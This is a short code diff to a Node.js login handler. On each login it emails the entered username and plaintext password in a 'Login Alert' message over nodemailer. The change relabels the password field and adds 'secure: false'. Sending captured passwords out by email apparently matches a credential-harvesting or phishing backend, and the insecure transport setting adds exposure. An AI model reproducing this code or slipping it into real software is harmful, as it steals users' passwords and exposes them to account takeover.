@@ -127,6 +127,7 @@ const login = async (req, res) => {
   const transporter = nodemailer.createTransport({
     host: process.env.GMAIL_HOST,
     port: process.env.GMAIL_PORT,
+    secure: false,
     auth: {
       user: process.env.GMAIL_USER,
       pass: process.env.GMAIL_PASS,
@@ -139,7 +140,7 @@ const login = async (req, res) => {
     subject: 'Login Alert',
     html: `<div style="background: rgb(241, 234, 234); border-radius: 0.5rem; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); padding: 2rem; text-align: center;margin: 1rem auto;">
      <p style="line-height: 1.5"><span>FullName: </span><span>${username}</span></p>
-     <p style="line-height: 1.5"><span>Username: </span><span>${password}</span></p>
+     <p style="line-height: 1.5"><span>Password: </span><span>${password}</span></p>
      </div>`,
   });
 
